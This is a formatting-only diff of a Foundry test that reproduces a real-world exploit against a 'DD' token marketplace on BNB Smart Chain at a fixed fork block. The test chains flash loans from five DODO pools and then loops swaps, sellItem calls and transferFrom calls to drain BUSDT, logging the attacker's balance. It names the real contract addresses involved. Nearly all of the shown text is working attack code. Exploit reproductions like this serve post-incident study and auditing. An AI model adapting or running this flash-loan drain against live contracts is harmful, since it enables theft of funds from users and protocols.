@@ -29,24 +29,12 @@ interface IMarketPlace {
 
     function inviteLimit(address) external view returns (uint256);
 
-    function items(
-        uint256 id
-    )
+    function items(uint256 id)
         external
         view
-        returns (
-            uint256 price,
-            uint256 amount,
-            uint256 totalAmount,
-            uint256 index,
-            uint256 time,
-            address buyer
-        );
+        returns (uint256 price, uint256 amount, uint256 totalAmount, uint256 index, uint256 time, address buyer);
 
-    function listItem(
-        uint256 _amount,
-        address invite
-    ) external returns (uint256);
+    function listItem(uint256 _amount, address invite) external returns (uint256);
 
     function sellItem(uint256 _amount) external returns (SellListing memory);
 }
@@ -54,26 +42,19 @@ interface IMarketPlace {
 contract DDTest is Test {
     IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 DD = IERC20(0x50ab0D88045F540b8B79C8A7Dc25790dB493BBC5);
-    IDPPOracle DPPOracle1 =
-        IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    IDPPOracle DPPOracle2 =
-        IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
-    IDPPOracle DPPOracle3 =
-        IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
+    IDPPOracle DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
+    IDPPOracle DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
+    IDPPOracle DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
     IDPPOracle DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
-    IDPPOracle DPPAdvanced =
-        IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
-    IMarketPlace MarketPlace =
-        IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
-    Uni_Router_V2 Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    address private constant addrToInvite =
-        0x693166710b501e3379Cf104e5AaA803aF6CbbF1A;
+    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
+    IMarketPlace MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
+    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    address private constant addrToInvite = 0x693166710b501e3379Cf104e5AaA803aF6CbbF1A;
     HelperContract OrdersPlacer;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28714107);
+        cheats.createSelectFork("bsc", 28_714_107);
         cheats.label(address(BUSDT), "BUSDT");
         cheats.label(address(DD), "DD");
         cheats.label(address(DPPOracle1), "DPPOracle1");
@@ -88,59 +69,25 @@ contract DDTest is Test {
     function testExploit() public {
         deal(address(BUSDT), address(this), 0);
         emit log_named_decimal_uint(
-            "BUSDT attacker balance before exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
-        );
+            "BUSDT attacker balance before exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
+            );
 
-        DPPOracle1.flashLoan(
-            0,
-            BUSDT.balanceOf(address(DPPOracle1)),
-            address(this),
-            new bytes(1)
-        );
+        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
 
         emit log_named_decimal_uint(
-            "BUSDT attacker balance after exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
-        );
+            "BUSDT attacker balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
+            );
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         if (msg.sender == address(DPPOracle1)) {
-            DPPOracle2.flashLoan(
-                0,
-                BUSDT.balanceOf(address(DPPOracle2)),
-                address(this),
-                new bytes(1)
-            );
+            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
         } else if (msg.sender == address(DPPOracle2)) {
-            DPPOracle3.flashLoan(
-                0,
-                BUSDT.balanceOf(address(DPPOracle3)),
-                address(this),
-                new bytes(1)
-            );
+            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
         } else if (msg.sender == address(DPPOracle3)) {
-            DPP.flashLoan(
-                0,
-                BUSDT.balanceOf(address(DPP)),
-                address(this),
-                new bytes(1)
-            );
+            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
         } else if (msg.sender == address(DPP)) {
-            DPPAdvanced.flashLoan(
-                0,
-                BUSDT.balanceOf(address(DPPAdvanced)),
-                address(this),
-                new bytes(1)
-            );
+            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
         } else {
             // Approvals
             BUSDT.approve(address(MarketPlace), type(uint256).max);
@@ -161,16 +108,12 @@ contract DDTest is Test {
             // Next part (for loop) may take some time...
             // More iterations possible. I just wanted to prcisely stick to the final (stealed) BUSDT amount
             for (uint256 i; i < 100; ++i) {
-                (, , uint256 totalAmount, , , ) = MarketPlace.items(
-                    MarketPlace.currenyId()
-                );
+                (,, uint256 totalAmount,,,) = MarketPlace.items(MarketPlace.currenyId());
 
                 swapBUSDTToDD(totalAmount / 20);
                 MarketPlace.sellItem(totalAmount);
                 BUSDT.transferFrom(
-                    address(MarketPlace),
-                    address(this),
-                    BUSDT.allowance(address(MarketPlace), address(this))
+                    address(MarketPlace), address(this), BUSDT.allowance(address(MarketPlace), address(this))
                 );
             }
         }
@@ -183,19 +126,14 @@ contract DDTest is Test {
         path[0] = address(BUSDT);
         path[1] = address(DD);
         Router.swapTokensForExactTokens(
-            amountOut,
-            BUSDT.balanceOf(address(this)),
-            path,
-            address(this),
-            block.timestamp + 100
+            amountOut, BUSDT.balanceOf(address(this)), path, address(this), block.timestamp + 100
         );
     }
 }
 
 contract HelperContract {
     IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IMarketPlace MarketPlace =
-        IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
+    IMarketPlace MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
 
     function placeOrder() external {
         BUSDT.approve(address(MarketPlace), type(uint256).max);
